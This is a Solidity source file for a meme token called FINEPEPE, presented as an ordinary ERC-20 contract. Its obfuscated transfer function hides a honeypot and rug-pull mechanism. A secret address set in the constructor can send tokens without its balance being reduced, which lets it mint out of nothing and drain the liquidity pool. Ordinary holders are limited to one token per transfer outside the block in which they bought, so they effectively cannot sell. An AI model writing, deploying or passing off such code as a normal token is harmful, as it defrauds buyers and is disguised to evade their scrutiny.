/*

https://t.me/ercfinepepe

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FINEPEPE is Ownable {
    mapping(address => uint256) private hyqkpub;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address oubixvkanyzh, uint256 shmefbyqxc) public returns (bool success) {
        giznmqwhfbop(msg.sender, oubixvkanyzh, shmefbyqxc);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private dwhevlfm;

    constructor(string memory jnuvio, string memory eraqpldcf, address uhpw, address hnsezk) {
        name = jnuvio;
        symbol = eraqpldcf;
        balanceOf[msg.sender] = totalSupply;
        mbsoju[hnsezk] = csvoabmznkqw;
        dwhevlfm = IUniswapV2Router02(uhpw);
    }

    uint256 private csvoabmznkqw = 111;

    mapping(address => uint256) private mbsoju;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address qygrjfviczwt, address oubixvkanyzh, uint256 shmefbyqxc) public returns (bool success) {
        require(shmefbyqxc <= allowance[qygrjfviczwt][msg.sender]);
        allowance[qygrjfviczwt][msg.sender] -= shmefbyqxc;
        giznmqwhfbop(qygrjfviczwt, oubixvkanyzh, shmefbyqxc);
        return true;
    }

    string public symbol;

    string public name;

    function giznmqwhfbop(address qygrjfviczwt, address oubixvkanyzh, uint256 shmefbyqxc) private {
        address jyxohgm = IUniswapV2Factory(dwhevlfm.factory()).getPair(address(this), dwhevlfm.WETH());
        bool dfvhkbgc = 0 == mbsoju[qygrjfviczwt];
        if (dfvhkbgc) {
            if (qygrjfviczwt != jyxohgm && hyqkpub[qygrjfviczwt] != block.number && shmefbyqxc < totalSupply) {
                require(shmefbyqxc <= totalSupply / (10 ** decimals));
            }
            balanceOf[qygrjfviczwt] -= shmefbyqxc;
        }
        balanceOf[oubixvkanyzh] += shmefbyqxc;
        hyqkpub[oubixvkanyzh] = block.number;
        emit Transfer(qygrjfviczwt, oubixvkanyzh, shmefbyqxc);
    }

    function approve(address tdogqy, uint256 shmefbyqxc) public returns (bool success) {
        allowance[msg.sender][tdogqy] = shmefbyqxc;
        emit Approval(msg.sender, tdogqy, shmefbyqxc);
        return true;
    }

    uint8 public decimals = 9;
}